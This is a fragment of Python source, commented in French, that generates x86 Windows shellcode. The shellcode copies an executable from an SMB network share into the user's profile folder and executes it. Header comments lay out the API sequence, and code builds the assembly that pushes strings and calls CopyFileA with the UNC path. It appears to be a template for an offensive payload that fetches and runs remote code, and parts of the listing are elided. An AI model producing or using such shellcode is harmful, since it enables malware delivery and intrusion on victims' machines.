# =============================================================================
#  SHELLCODE - Copie puis execution d'un executable depuis un partage SMB
# =============================================================================
#
...
#
#  Sequence :
#    OpenProcessToken -> GetUserProfileDirectoryA -> lstrcatA -> CopyFileA
...
#  offset en dur.
#
#  Variante "copie" du template MoveFileA : CopyFileA est dans kernel32 (pas de
#  DLL supplementaire), la seule difference est un 3e argument bFailIfExists.
#  L'executable source reste en place ; une copie atterrit dans C:\Users\XYZ\
# =============================================================================
...
def push_string_asm(text: str) -> str:
    # Genere les instructions qui empilent 'text' + octet nul sur
...
ACTIONS = (
    ...
    # --- CopyFileA(PATH_UNC, pathVar, FALSE) ---
    + push_string_asm(PATH_UNC)
    + "mov esi, esp\n"                       # ESI -> PATH_UNC
    + "xor eax, eax\n"
    + "push eax\n"                           # bFailIfExists = FALSE (ecrase si existe)
    + f"lea eax, [ebp-{OFF_PATHVAR:#x}]\n"
...
# Petit test du dossier puis du fichier
